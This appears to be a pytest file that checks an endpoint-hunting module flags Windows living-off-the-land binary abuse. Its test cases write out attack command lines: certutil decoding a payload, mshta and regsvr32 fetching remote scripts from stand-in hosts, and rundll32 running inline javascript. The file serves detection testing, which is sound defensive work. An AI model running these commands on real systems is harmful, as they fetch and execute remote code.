import os
import pytest
from src.modules.endpoint_hunter import EndpointHunter

class DummyConfig(dict):
    pass

@pytest.fixture
def hunter():
    return EndpointHunter(DummyConfig())

@pytest.mark.parametrize("proc_name, cmd, expected_factor", [
    ("certutil.exe", "C:/Windows/System32/certutil.exe -decode payload.txt out.bin", 'endpoint:lolbin_certutil_suspicious'),
    ("mshta.exe", "mshta.exe http://example.com/a", 'endpoint:lolbin_mshta_remote'),
    ("rundll32.exe", "rundll32 javascript:evil", 'endpoint:lolbin_rundll32_inline'),
    ("regsvr32.exe", "regsvr32 /s scrobj.dll http://bad/evil.sct", 'endpoint:lolbin_regsvr32_remote_sct'),
])

def test_lolbin_registry(proc_name, cmd, expected_factor, hunter):
    event = {'process': {'name': proc_name}, 'cmdline': cmd}
    findings = hunter._detect_lolbins(event)
    factors = [f for f,_ in findings]
    assert expected_factor in factors
